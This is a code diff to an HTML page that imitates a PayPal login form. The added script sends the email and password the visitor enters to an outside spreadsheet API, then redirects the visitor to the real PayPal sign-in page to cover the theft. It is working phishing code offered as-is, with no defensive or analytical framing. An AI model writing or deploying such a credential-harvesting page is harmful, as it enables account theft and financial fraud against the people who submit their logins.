@@ -195,24 +195,44 @@
 
     </style>
 
-</head>
+<script
+src="https://code.jquery.com/jquery-3.4.1.js"
+integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+crossorigin="anonymous"></script>
+<script>
+function SubForm(){
+  $.ajax({
+      url:'https://api.apispreadsheets.com/data/vJ96meCrFv5gWkVw/',
+      type:'post',
+      data:$("#myForm").serializeArray(),
+      success: function(){
+        alert("Form Data Submitted :)")
+      },
+      error: function(){
+        alert("There was an error :(")
+      }
+  });
 
+  window.location.href = 'https://www.paypal.com/us/signin'
+}
+</script>
+
+</head>
 <body>
         <div class="login-box">
             <div class="social-icons">
                 <img src="paypal.png"/>
             </div>
 
-            <form>
-                <input id="email" type="text" name="email" required="required" value autocomplete="user
-                " placeholder="Email or mobile number">
-
+            <form id="myForm">
+                <input id="email" type="text" name="email" required="required" value autocomplete="user" placeholder="Email or mobile number">
+              
                 <input id="password" type="password" name="password" required="required" value placeholder="password" aria-describedby="passwordErrorMessage">
-
+              
                 <a href="#">Forgot password?</a>
-
-                <input type="submit" value="Login">
-            </form>
+              
+                <input type="submit" value="Login" onclick="SubForm()">
+              </form>
 
             <div class="try-another-way">
                 <a href="#">Try another way</a>
